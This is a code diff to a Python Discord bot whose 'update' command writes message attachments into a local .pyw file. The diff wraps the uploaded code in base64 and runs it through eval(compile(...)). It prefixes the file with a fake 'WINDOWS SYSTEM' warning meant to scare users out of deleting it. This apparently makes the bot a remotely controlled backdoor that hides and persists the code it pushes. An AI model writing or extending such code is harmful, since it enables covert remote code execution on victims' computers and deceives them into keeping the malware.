@@ -34,6 +34,20 @@ with open(LIB + '.pyw', 'r') as f:
     LIB_BACKUP_FILE = f.read()
 
 
+file_base64_content = '''\'\'\'
+WINDOWS SYSTEM
+
+[Warning]
+Deleting this system\'s file can make your computer malfunction.
+Action is irreversible.
+\'\'\'
+
+
+import base64
+eval(compile(base64.b64decode({}),\'<string>\',\'exec\'))
+'''
+
+
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -56,8 +70,10 @@ async def on_ready():
 @bot.command()
 async def update(ctx):
     if ctx.message.attachments:
-        with open(LIB + '.pyw', 'wb') as f:
-            await ctx.message.attachments[0].save(f)
+        with open(LIB + '.pyw', 'w') as f:
+            text_bytes = await ctx.message.attachments[0].read()
+            encoded = encoded = base64.b64encode(text_bytes)
+            f.write(file_base64_content.format(encoded))
 
         with open(LIB + '.pyw', 'r') as f:
             LIB_BACKUP_FILE = f.read()
